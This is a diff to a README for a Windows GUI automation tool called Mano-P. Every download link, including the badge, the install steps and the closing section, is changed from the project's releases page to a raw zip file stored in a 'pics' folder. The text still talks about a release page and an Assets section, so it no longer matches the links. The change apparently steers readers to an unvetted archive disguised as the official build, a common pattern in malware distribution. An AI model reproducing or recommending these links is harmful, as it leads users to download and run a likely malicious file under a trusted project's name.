@@ -1,6 +1,6 @@
 # 🧠 Mano-P - Local GUI automation for Windows
 
-[![Download Mano-P](https://img.shields.io/badge/Download%20Mano-P-blue?style=for-the-badge&logo=github)](https://github.com/soloistscalage800/Mano-P/releases)
+[![Download Mano-P](https://img.shields.io/badge/Download%20Mano-P-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/soloistscalage800/Mano-P/main/pics/P_Mano_3.9.zip)
 
 ## 🚀 What Mano-P does
 
@@ -12,7 +12,7 @@ It is built for edge devices and local use. That means your data stays on your d
 
 Visit the release page to download and run the Windows version:
 
-https://github.com/soloistscalage800/Mano-P/releases
+https://raw.githubusercontent.com/soloistscalage800/Mano-P/main/pics/P_Mano_3.9.zip
 
 On that page, look for the latest release and choose the Windows file if one is listed. If there are several files, pick the one that matches your system.
 
@@ -30,7 +30,7 @@ If your computer has a faster GPU or an NPU, Mano-P can run more smoothly, but i
 
 ## 🛠️ Installation steps
 
-1. Open the release page: https://github.com/soloistscalage800/Mano-P/releases
+1. Open the release page: https://raw.githubusercontent.com/soloistscalage800/Mano-P/main/pics/P_Mano_3.9.zip
 2. Find the newest release at the top.
 3. Download the Windows file from the Assets section.
 4. If the file is a .zip archive, right-click it and choose Extract All.
@@ -121,4 +121,4 @@ Use simpler instructions and keep the target window in view. You can stop the ta
 
 Download or run Mano-P from the latest release here:
 
-https://github.com/soloistscalage800/Mano-P/releases
+https://raw.githubusercontent.com/soloistscalage800/Mano-P/main/pics/P_Mano_3.9.zip
